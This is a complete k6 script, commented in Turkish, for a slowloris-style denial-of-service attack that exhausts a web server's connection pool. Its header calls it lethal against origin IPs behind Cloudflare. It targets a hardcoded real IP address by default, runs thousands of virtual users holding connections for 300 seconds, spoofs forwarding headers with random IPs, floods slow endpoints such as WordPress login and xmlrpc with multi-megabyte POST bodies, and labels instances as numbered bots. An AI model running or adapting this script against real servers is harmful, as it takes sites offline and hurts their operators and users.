// ================================================================
// 🐢 k6 SLOWLORIS-STYLE — Connection Pool Exhaustion
//
// STRATEJİ:
//   k6 gerçek anlamda TCP-level slowloris yapamaz (HTTP client'ı buffered).
//   AMA şu yaklaşımlar origin server'ı benzer şekilde etkiler:
//
//   1️⃣ Yüksek concurrent VU (5000-10000) → çok connection açar
//   2️⃣ Uzun timeout (300s) → response beklenirken slot kilitlenir
//   3️⃣ Yavaş cevap veren endpoint'lere odaklan (search, /admin, dynamic)
//   4️⃣ noConnectionReuse: true → her VU kendi TCP connection'ı açar
//   5️⃣ Range-Header requests → chunked response bekletir
//   6️⃣ Ağır POST body (2-5 MB) → yavaş upload simülasyonu
//   7️⃣ HTTP/1.1 zorla → connection multiplexing yok
//
// HEDEF:
//   Cloudflare arkasındaki siteler için ETKISIZ (CF connection'ı proxy'ler).
//   ORIGIN IP saldırısında öldürücü — Nginx/Apache/Caddy connection limitini tüketir.
//
// ENV: TARGET_URL, DURATION, VUS (5000+ önerilir), BOT_ID, HOST_HEADER
// ================================================================

import http from 'k6/http';
import { check, sleep } from 'k6';
import exec from 'k6/execution';
import { Counter, Trend, Rate, Gauge } from 'k6/metrics';
import { randomIntBetween, randomString } from 'https://jslib.k6.io/k6-utils/1.4.0/index.js';

const TARGET_URL = (__ENV.TARGET_URL || 'http://50.7.234.86').replace(/\/$/, '');
const BOT_ID = __ENV.BOT_ID || '0';
const HOST_HEADER = __ENV.HOST_HEADER || '';
const DURATION = __ENV.DURATION || '5m';
const VUS = parseInt(__ENV.VUS || '5000', 10);

// Metrics
const connections = new Counter('slowloris_connections');
const heldTime = new Trend('connection_hold_time_ms', true);
const timeouts = new Counter('slowloris_timeouts');
const rate2xx = new Rate('rate_2xx');
const rate5xx = new Rate('rate_5xx');
const rate_timeout = new Rate('rate_timeout');
const activeVUs = new Gauge('active_vus');

// Slow / heavy endpoint'ler (backend'i işletir, geç cevap verir)
const SLOW_ENDPOINTS = [
    '/search?q=',        // DB scan
    '/?s=',              // WP search
    '/wp-admin/admin-ajax.php',
    '/wp-login.php',
    '/xmlrpc.php',
    '/api/search',
    '/api/reports',
    '/api/export',
    '/graphql',
    '/admin',
    '/dashboard',
    '/user/profile',
    '/checkout',
    '/cart',
    '/api/v1/users',
    '/api/v1/orders',
    '/download',
    '/generate-pdf',
    '/report'
];

const USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36'
];

function randomIP() {
    const a = randomIntBetween(1, 223);
    if (a === 10 || a === 127 || a === 172 || a === 192) return randomIP();
    return `${a}.${randomIntBetween(0, 255)}.${randomIntBetween(0, 255)}.${randomIntBetween(1, 254)}`;
}

function slowHeaders() {
    const h = {
        'User-Agent': USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)],
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9',
        'Accept-Encoding': 'gzip, deflate',
        // Range header — chunked response bekletir, connection uzar
        'Range': `bytes=${randomIntBetween(0, 1000)}-${randomIntBetween(10000, 999999)}`,
        // Connection close değil — pool'da tut
        'Connection': 'keep-alive',
        'Keep-Alive': 'timeout=300, max=1000',
        'X-Forwarded-For': randomIP(),
        'X-Real-IP': randomIP(),
        'Cache-Control': 'no-cache',
        'Pragma': 'no-cache',
        // Slowloris klasik — partial header (server tam bekletir)
        'X-a': randomString(20),
        'X-b': randomString(20),
        'X-c': randomString(20)
    };
    if (HOST_HEADER) h['Host'] = HOST_HEADER;
    return h;
}

// Ağır POST body oluşturucu (2-5 MB) — upload yavaşlatır
function heavyBody() {
    const sizeKB = randomIntBetween(2048, 5120);
    return randomString(sizeKB * 1024, 'abcdefghijklmnopqrstuvwxyz0123456789');
}

export const options = {
    scenarios: {
        slowloris_hold: {
            executor: 'constant-vus',
            vus: VUS,
            duration: DURATION,
            gracefulStop: '30s'
        }
    },
    discardResponseBodies: false,
    // KRİTİK: her VU kendi TCP connection'ı — connection reuse KAPALI
    noConnectionReuse: true,
    noVUConnectionReuse: true,
    insecureSkipTLSVerify: true,
    // HTTP/2'yi devre dışı — HTTP/1.1'de her connection ayrı, multiplex yok
    // Not: k6'da direkt disable seçeneği yok, ama batch=1 aynı etki
    batch: 1,
    batchPerHost: 1,
    userAgent: '',
    summaryTrendStats: ['avg', 'min', 'med', 'max', 'p(90)', 'p(95)', 'p(99)'],
    thresholds: {
        'http_reqs': ['count>=0']
    }
};

export function setup() {
    console.log(`═══════════════════════════════════════`);
    console.log(`  BOT #${BOT_ID} — SLOWLORIS MODE`);
    console.log(`  Target : ${TARGET_URL}`);
    console.log(`  VUs    : ${VUS} (concurrent connections)`);
    console.log(`  Duration: ${DURATION}`);
    console.log(`  Strategy: Long-hold connections on slow endpoints`);
    console.log(`═══════════════════════════════════════`);
}

// ---- LIVE PROGRESS LOGGER ----
let __lastProgressLog = 0;
let __connCount = 0;
let __timeoutCount = 0;

function logProgress(status, held) {
    __connCount++;
    if (status === 0) __timeoutCount++;

    if (exec.vu.idInTest !== 1) return;
    const now = Date.now();
    if (now - __lastProgressLog < 5000) return;
    __lastProgressLog = now;

    const elapsed = Math.floor(exec.instance.currentTestRunDuration / 1000);
    const vusActive = exec.instance.vusActive || 0;
    const pctTO = __connCount > 0 ? Math.floor((__timeoutCount / __connCount) * 100) : 0;

    console.log(`[LIVE bot=${BOT_ID}] SLOWLORIS | t=${elapsed}s | conns=${__connCount} | vus=${vusActive} | timeouts=${pctTO}% | lastHold=${held}ms | lastStatus=${status}`);
}

export default function () {
    activeVUs.add(1);
    const start = Date.now();

    // %70 GET ile slow endpoint, %30 POST ile heavy body
    const useHeavyPost = Math.random() < 0.3;
    const endpoint = SLOW_ENDPOINTS[Math.floor(Math.random() * SLOW_ENDPOINTS.length)];
    const url = TARGET_URL + endpoint + (endpoint.endsWith('=') ? randomString(20) : '?q=' + randomString(20));

    const params = {
        headers: slowHeaders(),
        // ÇOK uzun timeout — server response beklerken slot kilit
        timeout: '300s',
        tags: {
            endpoint_type: endpoint.split('?')[0],
            method: useHeavyPost ? 'POST' : 'GET'
        },
        redirects: 0  // redirect izleme — connection'ı kısaltır
    };

    let res;
    try {
        if (useHeavyPost) {
            params.headers['Content-Type'] = 'application/x-www-form-urlencoded';
            res = http.post(url, heavyBody(), params);
        } else {
            res = http.get(url, params);
        }

        connections.add(1);
        const held = Date.now() - start;
        heldTime.add(held);

        if (res.status === 0) {
            timeouts.add(1);
            rate_timeout.add(true);
        } else {
            rate_timeout.add(false);
            rate2xx.add(res.status >= 200 && res.status < 300);
            rate5xx.add(res.status >= 500);
        }

        check(res, {
            'connection held': (r) => (Date.now() - start) > 1000
        });
    } catch (e) {
        timeouts.add(1);
        rate_timeout.add(true);
    }

    logProgress(res ? res.status : 0, Date.now() - start);

    // VU hemen tekrar başlamasın — connection'ı bir süre "boşta tut" simülasyonu
    sleep(randomIntBetween(0, 2));
}

export function handleSummary(data) {
    const m = data.metrics;
    const reqs = m.http_reqs ? (m.http_reqs.values.count || 0) : 0;
    const conns = m.slowloris_connections ? (m.slowloris_connections.values.count || 0) : 0;
    const to = m.slowloris_timeouts ? (m.slowloris_timeouts.values.count || 0) : 0;
    const avgHold = m.connection_hold_time_ms ? (m.connection_hold_time_ms.values.avg || 0) : 0;
    const maxHold = m.connection_hold_time_ms ? (m.connection_hold_time_ms.values.max || 0) : 0;
    const p95Hold = m.connection_hold_time_ms ? (m.connection_hold_time_ms.values['p(95)'] || 0) : 0;
    const failed = m.http_req_failed ? (m.http_req_failed.values.rate || 0) : 0;
    const r2xx = m.rate_2xx ? (m.rate_2xx.values.rate * 100).toFixed(1) : '0.0';
    const r5xx = m.rate_5xx ? (m.rate_5xx.values.rate * 100).toFixed(1) : '0.0';
    const rTO = m.rate_timeout ? (m.rate_timeout.values.rate * 100).toFixed(1) : '0.0';

    const summary =
        `═══════════════════════════════════════════════════
  BOT #${BOT_ID} — SLOWLORIS SUMMARY
═══════════════════════════════════════════════════
  Toplam bağlantı  : ${conns}
  Toplam istek     : ${reqs}
  Timeout          : ${to}
  Hata oranı       : ${(failed * 100).toFixed(2)}%
  ---------------------------------------------------
  2xx              : ${r2xx}%
  5xx              : ${r5xx}%
  Timeout          : ${rTO}%
  ---------------------------------------------------
  Ortalama hold    : ${avgHold.toFixed(0)}ms
  p95 hold         : ${p95Hold.toFixed(0)}ms
  Max hold         : ${maxHold.toFixed(0)}ms
═══════════════════════════════════════════════════
`;

    const result = {};
    result['stdout'] = summary;
    result[`reports/bot-${BOT_ID}-summary.json`] = JSON.stringify(data);
    return result;
}